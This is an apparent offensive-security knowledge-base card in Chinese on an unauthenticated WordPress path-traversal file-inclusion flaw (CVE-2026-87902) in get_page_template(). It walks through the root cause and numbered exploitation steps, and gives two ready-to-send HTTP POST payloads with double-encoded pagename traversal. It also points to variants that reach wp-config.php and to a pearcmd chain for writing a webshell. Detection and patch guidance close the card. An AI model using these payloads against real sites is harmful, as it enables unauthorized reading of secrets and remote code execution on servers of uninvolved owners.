---
id: web-php-file-inclusion-wordpress-page-template-path-traversal
title: WordPress get_page_template 页面模板路径遍历未授权 LFI（CVE-2026-87902）
type: scenario
domain: web
path: web/php/file-inclusion
technique: wordpress-page-template-path-traversal
aliases:
- CVE-2026-87902
- WordPress 页面模板路径遍历
- get_page_template LFI
- pagename 双重编码遍历
- WordPress 未授权文件包含
- page-templates 目录遍历
tags:
- php
- wordpress
- file-inclusion
- lfi
- path-traversal
- cve-2026-87902
- template
cve:
- CVE-2026-87902
severity: critical
confidence: high
affected_versions: WordPress 4.7.0–7.1.1（原文按分支列出 4.7.0-4.7.36 至 7.1.0-7.1.1；修复于 7.1.2 及各分支后续版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T04:41:54+08:00'
  notes: 已对照原文全文与17张图核对：pagename 双重编码→is_page 仅看变量非空→get_page_by_path 清洗失败但变量保留→wp_basename/sanitize_title_with_dashes 保留%XX→page_id 分支用=覆盖WHERE→200→get_page_template urldecode 后无validate_file→locate_template 拼接include；实测 wp-links-opml 返回 OPML、7.1.1 环境。图01 公告含 7.1.2/7.0.6 等 patched versions，affected_versions 保留。未复现。
---

## 一句话结论

未认证攻击者向 WordPress 发送 `page_id=<真实页面>` 加双重 URL 编码的 `pagename=templates%252f%252e%252e...`，可让 `get_page_template()` 的“先过滤后解码”逻辑生成 `page-templates/../../../../<目标>` 候选模板，再由 `locate_template()` 拼接并 `include`，从而包含活动主题目录之外的任意可读 `.php` 文件；在目标文件、`register_argc_argv` 等条件满足时可进一步 RCE。

## 原理

- **入口与编码**：`pagename` 是 WordPress 公开 query var，`WP::parse_request()` 按 `$_POST → $_GET → 伪静态规则` 取值。PHP 已对查询串做一次 URL 解码，因此发送 `%252f`、`%252e`（双重编码）后，`query_vars['pagename']` 中保存的是“一次编码态” `templates%2f%2e%2e...`。
- **is_page 只看变量非空**：`WP_Query` 在 `pagename` 非空或 `page_id` 非空时直接置 `is_page=true`，不要求 slug 对应真实页面。
- **slug 解析必然失败但无关紧要**：`get_page_by_path()` 会 `urldecode` 后按 `/` 分段并用 `sanitize_title_for_query()` 清洗，字面量 `..` 被清空，解析返回 null；`queried_object` 被 unset，但 `is_page` 仍为 true，`query_vars['pagename']` 仍是编码态。
- **SQL 构建中的过滤失效**：`get_posts()` 对 `pagename` 分支执行 `sanitize_title_for_query(wp_basename($pagename))`。`wp_basename()` 内部先 `urlencode` 再 `str_replace('%2F','/')`，对已编码的 `%2f` 会先变成 `%252f`，匹配不到裸 `%2F`，`basename()` 不切分，最后 `urldecode` 还原，等于身份函数；`sanitize_title_with_dashes()` 又有 “Preserve escaped octets” 逻辑，保留合法 `%XX`。结果是 `pagename` 原样存活。
- **WHERE 覆盖搭车真实页面**：pagename 分支先把 `$where` 设成 `ID='0'`（死条件），随后 `page_id` 分支用赋值 `$where = " AND ID = <page_id>"` 整体覆盖（不是 `.=`），于是主查询按真实 `page_id` 查出页面，`handle_404()` 因 posts 非空放行，请求以 200 进入模板加载。
- **模板分发与核心缺陷**：`template-loader.php` 在 `is_page` 时调用 `get_page_template()`。该函数读取仍为编码态的 `pagename`，在最后一刻 `urldecode()`；只要解码前后不同，就把 `"page-{$pagename_decoded}.php"` 加入候选列表且**不做 `validate_file()` 校验**（同函数对 `_wp_page_template` meta 是校验过的，这是历史加固的旁路遗漏）。
- **路径拼接与 include**：`get_query_template()`/`locate_template()` 把候选直接拼到 `$wp_stylesheet_path . '/' . $template_name` 并 `file_exists()` 检查，没有目录边界校验。`page-` 前缀加载荷首段 `templates/` 构成真实存在的 `page-templates/` 目录，后面的 `../` 才能逐级爬出主题目录；最终 `template-loader.php` 只做 `realpath`、`.php` 后缀与可读性检查，不限制目录，随后 `include $template`。
- **每分钟/每请求的完整性**：主题必须存在以 `page-` 开头的顶级目录（如 `page-templates/`）；受影响主题包括旧版 Twenty Twelve/Twenty Fourteen 以及 Neve、Hestia、Sydney 等。

## 触发条件

- WordPress 受影响版本（4.7.0–7.1.1 各分支），活动父/子主题存在 `page-templates/` 一类以 `page-` 开头的顶级目录。
- 站点存在至少一个真实页面（PoC 用 `page_id=2`），用于让主查询命中、404 放行。
- 攻击者构造的遍历终点是服务器上 Web 用户可读、以 `.php` 结尾的本地文件。
- 未认证即可触发；无需登录或上传权限。

## 利用步骤

1. 确认目标主题包含 `page-templates/`（或任意 `page-` 开头目录），并找到一个真实页面 ID（如 `page_id=2`）。
2. 计算目标文件相对站点根的路径，构造 `templates/` + 若干 `../` + 目标路径（不含 `.php` 后缀，函数会自动补）。
3. 对 `pagename` 做双重 URL 编码：`/`→`%252f`、`.`→`%252e`。
4. 发送 `POST /`，同时带 `page_id=<真实页面>` 与 `pagename=<双重编码载荷>`；`pagename` 也可放在查询串。
5. 观察响应：若目标为 `wp-links-opml` 会返回 OPML XML；若目标为静默文件则返回 200 空 Body，可据此判定 LFI 成功。
6. 需要 RCE 时，把遍历终点改为 `usr/local/lib/php/pearcmd`，再配合 pearcmd argv 注入写入 webshell（见关联卡片）。

## PoC

确认 LFI（包含站点根目录的 `wp-links-opml.php`）：

```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

page_id=2&pagename=templates%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-links-opml
```

解码后的候选路径为 `page-templates/../../../../wp-links-opml.php`，文件系统解析到站点根的 `wp-links-opml.php`；响应为 OPML XML（HTTP 200）。

无副作用探测（包含 `wp-content/index.php`，内容为 `// Silence is golden.`）：

```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

page_id=2&pagename=templates%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252findex
```

返回 200 且 Body 为空，而正常页面约 23KB，可作差异判定。

## 变体与关联

- 变体：目标文件换成 `wp-config.php`、插件/上传目录中的 `.php`、日志/会话文件（需先能控制内容）；也可包含会执行副作用的业务文件。
- 变体：子主题/父主题目录层级不同，`../` 数量按 `page-templates/` 到站点根的深度调整；主题在子目录时按实际路径计算。
- 变体：`get_template_part()`、`load_template()` 同样汇聚到 `locate_template()`，审计时应一并评估其他调用方。
- 关联卡片：[[web-php-file-inclusion-pearcmd-argv-config-create-webshell]]（本 LFI 转 RCE 的 pearcmd 链）、[[web-php-file-inclusion-thinkphp-view-template]]（另一框架模板包含 LFI）。
- 边界：主题没有 `page-` 开头真实目录时首段 `file_exists()` 失败；修复版本对解码候选加 `validate_file()` 并在 `locate_template()` 用 `realpath` 做目录边界校验，链条断裂。

## 检测与防御

- 检测：请求中出现 `pagename` 含 `%252f`/`%252e` 等双重编码遍历、同时带 `page_id`；响应 200 但 Body 异常小/为空；`pagename` 解码后含 `../`。
- 日志特征：`page_id` 与超长 `pagename` 同现、`pagename` 以 `templates%252f` 开头、目标为 `wp-links-opml`/`pearcmd`/`wp-config` 等。
- 修复：升级到 WordPress 7.1.2 或对应分支修复版本；修复包含两层：`get_page_template()` 对 `urldecode` 后的候选调用 `validate_file()`，`locate_template()` 新增 `_wp_is_template_path_allowed()`，用 `realpath` 强制加载路径落在当前主题、父主题、`wp-includes/theme-compat/` 及主题直接父目录内。
- 加固：WAF/网关阻断 `pagename` 中的双重编码路径分隔与 `..`；限制主题目录写权限；及时移除不需要的 `page-templates/` 目录只能降低可利用性，不能替代补丁。
